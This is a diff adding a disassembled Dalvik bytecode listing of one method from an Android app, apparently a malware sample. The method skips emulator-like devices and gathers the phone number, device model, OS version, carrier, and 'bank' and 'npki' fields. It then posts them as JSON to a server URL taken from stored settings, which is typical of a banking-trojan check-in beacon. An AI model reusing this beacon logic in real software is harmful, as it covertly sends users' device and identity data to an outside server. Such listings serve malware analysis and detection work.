@@ -1,0 +1,101 @@
+# Lkk/chunyu/MainActivity0530$2;->run()V [access_flags=public]
+#
+# Parameters:
+# local registers: v0...v8
+#
+# - return:void
+
+run-BB@0x0 : [ run-BB@0x3c run-BB@0x3e ]
+	0       (00000000) const-string         v3, 'shit'
+	1       (00000004) const-string         v4, '1'
+	2       (00000008) invoke-static        v3, v4, Landroid/util/Log;->i(Ljava/lang/String; Ljava/lang/String;)I
+	3       (0000000e) new-instance         v1, Lorg/json/JSONObject;
+	4       (00000012) invoke-direct        v1, Lorg/json/JSONObject;-><init>()V
+	5       (00000018) iget-object          v3, v8, Lkk/chunyu/MainActivity0530$2;->this$0 Lkk/chunyu/MainActivity0530;
+	6       (0000001c) invoke-virtual       v3, Lkk/chunyu/MainActivity0530;->getApplicationContext()Landroid/content/Context;
+	7       (00000022) move-result-object   v3
+	8       (00000024) invoke-static        v3, Lkk/util/StUtil;->getMachine(Landroid/content/Context;)Ljava/lang/String;
+	9       (0000002a) move-result-object   v2
+	10      (0000002c) const-string         v3, '88'
+	11      (00000030) invoke-virtual       v3, v2, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+	12      (00000036) move-result          v3
+	13      (00000038) if-eqz               v3, +3
+
+run-BB@0x3c : 
+	14      (0000003c) return-void          
+
+run-BB@0x3e : [ run-BB@0x72 run-BB@0x3c ]
+	15      (0000003e) const-string         v3, 'mobile'
+	16      (00000042) iget-object          v4, v8, Lkk/chunyu/MainActivity0530$2;->this$0 Lkk/chunyu/MainActivity0530;
+	17      (00000046) invoke-virtual       v4, Lkk/chunyu/MainActivity0530;->getApplicationContext()Landroid/content/Context;
+	18      (0000004c) move-result-object   v4
+	19      (0000004e) invoke-static        v4, Lkk/util/StUtil;->getMachine(Landroid/content/Context;)Ljava/lang/String;
+	20      (00000054) move-result-object   v4
+	21      (00000056) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	22      (0000005c) sget-object          v3, Landroid/os/Build;->MODEL Ljava/lang/String;
+	23      (00000060) const-string         v4, 'ARM'
+	24      (00000064) invoke-virtual       v3, v4, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
+	25      (0000006a) move-result          v3
+	26      (0000006c) const/4              v4, -1
+	27      (0000006e) if-ne                v3, v4, -19
+	3e:149
+	(Lorg/json/JSONException; -> 14e run-BB@0x14e)
+
+run-BB@0x72 : [ run-BB@0x3c ]
+	28      (00000072) const-string         v3, 'machine'
+	29      (00000076) sget-object          v4, Landroid/os/Build;->MODEL Ljava/lang/String;
+	30      (0000007a) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	31      (00000080) const-string         v3, 'sversion'
+	32      (00000084) sget-object          v4, Landroid/os/Build$VERSION;->RELEASE Ljava/lang/String;
+	33      (00000088) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	34      (0000008e) const-string         v3, 'bank'
+	35      (00000092) const-string         v4, ''
+	36      (00000096) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	37      (0000009c) const-string         v3, 'provider'
+	38      (000000a0) iget-object          v4, v8, Lkk/chunyu/MainActivity0530$2;->this$0 Lkk/chunyu/MainActivity0530;
+	39      (000000a4) invoke-static        v4, Lkk/util/NetUtil;->getProvidersName(Landroid/content/Context;)Ljava/lang/String;
+	40      (000000aa) move-result-object   v4
+	41      (000000ac) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	42      (000000b2) const-string         v3, 'npki'
+	43      (000000b6) const-string         v4, '1'
+	44      (000000ba) invoke-virtual       v1, v3, v4, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	45      (000000c0) iget-object          v3, v8, Lkk/chunyu/MainActivity0530$2;->this$0 Lkk/chunyu/MainActivity0530;
+	46      (000000c4) new-instance         v4, Ljava/lang/StringBuilder;
+	47      (000000c8) invoke-direct        v4, Ljava/lang/StringBuilder;-><init>()V
+	48      (000000ce) iget-object          v5, v8, Lkk/chunyu/MainActivity0530$2;->this$0 Lkk/chunyu/MainActivity0530;
+	49      (000000d2) iget-object          v5, v5, Lkk/chunyu/MainActivity0530;->sp Lkk/util/SPUtil;
+	50      (000000d6) const-string         v6, 'URL'
+	51      (000000da) const-string         v7, ''
+	52      (000000de) invoke-virtual       v5, v6, v7, Lkk/util/SPUtil;->getValue(Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;
+	53      (000000e4) move-result-object   v5
+	54      (000000e6) invoke-virtual       v4, v5, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	55      (000000ec) move-result-object   v4
+	56      (000000ee) const-string         v5, '/servlet/OnLine'
+	57      (000000f2) invoke-virtual       v4, v5, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	58      (000000f8) move-result-object   v4
+	59      (000000fa) invoke-virtual       v4, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	60      (00000100) move-result-object   v4
+	61      (00000102) new-instance         v5, Ljava/lang/StringBuilder;
+	62      (00000106) invoke-direct        v5, Ljava/lang/StringBuilder;-><init>()V
+	63      (0000010c) const-string         v6, '{"json":"'
+	64      (00000110) invoke-virtual       v5, v6, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	65      (00000116) move-result-object   v5
+	66      (00000118) invoke-virtual       v1, Lorg/json/JSONObject;->toString()Ljava/lang/String;
+	67      (0000011e) move-result-object   v6
+	68      (00000120) invoke-static        v6, Lkk/util/StUtil;->stringToJson(Ljava/lang/String;)Ljava/lang/String;
+	69      (00000126) move-result-object   v6
+	70      (00000128) invoke-virtual       v5, v6, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	71      (0000012e) move-result-object   v5
+	72      (00000130) const-string         v6, '"}'
+	73      (00000134) invoke-virtual       v5, v6, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	74      (0000013a) move-result-object   v5
+	75      (0000013c) invoke-virtual       v5, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	76      (00000142) move-result-object   v5
+	77      (00000144) invoke-static        v3, v4, v5, Lkk/util/StUtil;->postJson(Landroid/content/Context; Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;
+	78      (0000014a) goto/16              -87
+
+run-BB@0x14e : [ run-BB@0x3c ]
+	79      (0000014e) move-exception       v0
+	80      (00000150) invoke-virtual       v0, Lorg/json/JSONException;->printStackTrace()V
+	81      (00000156) goto/16              -8d
+
